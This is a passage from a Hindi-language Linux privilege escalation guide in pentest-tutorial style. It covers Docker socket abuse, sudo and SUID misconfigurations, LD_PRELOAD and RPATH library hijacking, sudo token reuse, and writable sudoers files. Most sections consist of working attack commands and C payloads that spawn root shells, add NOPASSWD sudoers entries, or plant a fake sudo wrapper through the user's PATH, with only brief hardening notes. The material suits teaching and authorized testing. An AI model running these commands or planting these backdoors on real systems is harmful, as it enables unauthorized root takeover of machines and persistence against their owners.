ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की बात कर रहा हूँ जो unix sockets के रूप में काम करती हैं_)। आप इसे निम्न कमांड से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **HTTP request का उत्तर देता है**, तो आप इसके साथ **संवाद** कर सकते हैं और शायद किसी vulnerability को **exploit** कर सकेंगे।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा लिखने योग्य होता है। इस socket पर write access होने से privilege escalation हो सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके क्या हैं अगर Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges बढ़ा सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host की फ़ाइल प्रणाली पर root-स्तरीय पहुँच के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का सीधे उपयोग**

ऐसी स्थितियों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को Docker API और `curl` कमांड्स का उपयोग करके अभी भी नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** एक ऐसा container बनाने के लिए अनुरोध भेजें जो host सिस्टम की root डायरेक्टरी को mount करे।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से कनेक्शन स्थापित करने के लिए `socat` का उपयोग करें, जिससे उसके भीतर कमांड निष्पादित करने में सक्षम हों।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

socat कनेक्शन सेटअप करने के बाद, आप container के अंदर सीधे कमांड चला सकते हैं और host की फ़ाइल प्रणाली पर root-स्तरीय पहुँच प्राप्त कर सकते हैं।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

docker से बाहर निकलने या इसे abuse करके privileges escalate करने के और तरीके देखें:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आपको पता चलता है कि आप **`ctr`** कमांड का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको पता चलता है कि आप **`runc`** कमांड का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) सिस्टम है जो applications को कुशलतापूर्वक इंटरेक्ट और डेटा शेयर करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ़्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा विनिमय को बढ़ाता है, और यह **enhanced UNIX domain sockets** की तरह है। इसके अलावा, यह events या signals के ब्रॉडकास्ट में मदद करता है, जिससे सिस्टम घटकों के बीच seamless integration को बढ़ावा मिलता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon से एक सिग्नल संगीत प्लेयर को mute कराने के लिए कह सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object सिस्टम का समर्थन करता है, जो एप्लिकेशन के बीच service requests और method invocations को सरल बनाता है और परंपरागत रूप से जटिल प्रक्रियाओं को सरल बनाता है।

D-Bus एक **allow/deny model** पर काम करता है, संदेश अनुमतियों (method calls, signal emissions, आदि) को matching policy rules के संचयी प्रभाव के आधार पर प्रबंधित करता है। ये नीतियाँ bus के साथ इंटरैक्शन्स को निर्दिष्ट करती हैं, और इन अनुमतियों के शोषण के माध्यम से privilege escalation की संभावना हो सकती है।

ऐसी नीति का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root उपयोगकर्ता को `fi.w1.wpa_supplicant1` का मालिक होने, उसे संदेश भेजने और प्राप्त करने की अनुमतियों का विवरण देता है।

जिस नीतियों में कोई निर्दिष्ट user या group नहीं होता है वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट नीतियों द्वारा कवर नहीं किया गया है।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करके और मशीन की स्थिति का पता लगाकर हमेशा दिलचस्प जानकारी मिलती है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनसे आप इसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। यदि कर पाएँ तो आप कुछ credentials हासिल कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो उपयोगकर्ताओं को **UID > INT_MAX** होने पर अधिकार बढ़ाने की अनुमति देता है। More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे एक्सप्लॉइट करने के लिए** उपयोग करें: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्या क्लिपबोर्ड में कुछ दिलचस्प है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप वातावरण का कोई भी **पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आप काफी शोर करने की परवाह नहीं करते और कंप्यूटर पर `su` और `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख** सकते हैं तो आप privileges escalate कर सकते हैं—**writable फ़ोल्डर के अंदर backdoor बनाकर** उस कमांड के नाम से जिसे किसी अलग user (ideal में root) द्वारा execute किया जाएगा और जो $PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं होता**।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ कमांड execute करने की अनुमति हो सकती है, या उन पर suid bit सेट हो सकता है। इसे जाँचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको फ़ाइलें पढ़ने और/या लिखने या यहां तक कि कोई command execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को किसी अन्य उपयोगकर्ता के अधिकारों के साथ कुछ कमांड पासवर्ड जाने बिना चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब `root` डायरेक्टरी में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी कमाण्ड/प्रोसेस को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, स्क्रिप्ट को root के रूप में निष्पादित करते समय arbitrary python library लोड करने के लिए **PYTHONPATH hijacking** के प्रति **vulnerable** था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive स्टार्टअप व्यवहार का लाभ उठाकर किसी अनुमत कमांड को कॉल करने पर मनमाना कोड को root के रूप में चला सकते हैं।

- Why it works: नॉन-इंटरेक्टिव शेल्स के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और लक्ष्य स्क्रिप्ट चलाने से पहले उस फ़ाइल को सोर्स करता है। कई sudo नियम एक script या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ सोर्स की जाती है।

- Requirements:
- एक sudo नियम जिसे आप चला सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जांचने के लिए `sudo -l`)। 

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग होता है तो sudo I/O logging और alerting पर विचार करें।

### Sudo execution bypassing paths

**Jump** करके अन्य फ़ाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
अगर एक **wildcard** का उपयोग किया जाए (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एक कमांड के लिए **sudo permission** बिना path निर्दिष्ट किये दिया गया हो: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसका exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उस स्थिति में भी उपयोग की जा सकती है यदि कोई **suid** binary **किसी अन्य कमांड को बिना path निर्दिष्ट किए execute करता है (हमेशा _**strings**_ से किसी अजीब SUID binary की सामग्री चेक करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि **suid** binary **path को specify करते हुए किसी अन्य कमांड को execute करता है**, तो आप कोशिश कर सकते हैं कि उस कमांड के नाम से एक function बनाया जाए और उसे **export a function** किया जाए जिसे suid फ़ाइल कॉल कर रही है।

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग एक या एक से अधिक shared libraries (.so files) को निर्दिष्ट करने के लिए किया जाता है जिन्हें loader द्वारा सभी अन्य लाइब्रेरीज़ से पहले लोड किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को एक लाइब्रेरी को preload करना कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फीचर के शोषण को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** को नजरअंदाज करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वही libraries preload की जाती हैं जो standard paths में हैं और जो स्वयं भी suid/sgid हैं।

Privilege escalation हो सकती है यदि आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में कथन **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को तब भी स्थापित और मान्यता प्राप्त होने की अनुमति देता है जब कमांड `sudo` के साथ चलाए जाते हैं, जिससे संभावित रूप से बढ़ी हुई privileges के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है क्योंकि वह उन पथों को नियंत्रित करता है जहाँ लाइब्रेरियाँ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

यदि किसी असामान्य दिखने वाले बाइनरी में **SUID** अनुमतियाँ हों, तो यह जाँचना अच्छा होता है कि यह **.so** फाइलें सही ढंग से लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का मिलना संभावित exploit का संकेत देता है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें निम्न के साथ:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary चलाने से exploit ट्रिगर होना चाहिए, जो संभावित system compromise की अनुमति देता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो ऐसे folder से library लोड कर रहा है जहाँ हम लिख सकते हैं, तो चलिए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा **root के स्वामित्व वाला और setuid के साथ**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को अनंत कर देता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।  
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के तौर पर PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना निम्न करके **obtain sudo privileges** कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\\
**यदि** आप इस फ़ाइल को **read** कर सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी फ़ाइल को **write** कर सकते हैं तो आप **escalate privileges** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प होते हैं, जैसे OpenBSD के लिए `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में जाँचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आम तौर पर machine से जुड़ता है और `sudo` का उपयोग करता है** और आपने उसी user context में shell हासिल कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके code को root के रूप में चलाएगा और फिर user's कमांड को। फिर, **$PATH को modify** करें user context का (उदाहरण के लिए नया path .bash_profile में जोड़कर) ताकि जब user `sudo` execute करे, तो आपका sudo executable चल जाए।

ध्यान रखें कि यदि user अलग shell (bash नहीं) उपयोग करता है तो आपको नया path जोड़ने के लिए अन्य फाइलें modify करनी पड़ेंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप दूसरा उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ ऐसा चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की गई कॉन्फ़िगरेशन फाइलें कहाँ से आती हैं**। आमतौर पर, इस फ़ाइल में निम्न पाथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फाइलें **दूसरे फोल्डरों की ओर संकेत करती हैं** जहाँ **लाइब्रेरीज़** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरियों की खोज करेगा**।

यदि किसी कारणवश **a user has write permissions** ऊपर दिए गए किसी भी पाथ पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के किसी भी फाइल पर या `/etc/ld.so.conf.d/*.conf` में config फाइल के भीतर किसी भी फ़ोल्डर पर, तो वह escalate privileges कर सकता है.\
निम्नलिखित पृष्ठ पर **how to exploit this misconfiguration** देखें:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, यह `RPATH` वैरिएबल में निर्दिष्ट स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक दुष्ट लाइब्रेरी बनाएं `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities किसी process को **subset of the available root privileges to a process** प्रदान करती हैं। यह प्रभावी रूप से root **privileges into smaller and distinctive units** में विभाजित कर देता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह full set of privileges घटाया जाता है, जिससे exploitation के जोखिम कम होते हैं।\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) डिस्क्रेशनरी permissions की एक द्वितीयक परत हैं, जो पारंपरिक ugo/rwx permissions को **overriding the traditional ugo/rwx permissions** करने में सक्षम बनाती है। ये permissions फ़ाइल या डायरेक्टरी के एक्सेस पर नियंत्रण बढ़ाते हैं, क्योंकि वे उन specific users को अधिकार देने या न देने की अनुमति देते हैं जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। यह स्तर **granularity ensures more precise access management** प्रदान करता है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करण** में आप किसी दूसरे user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
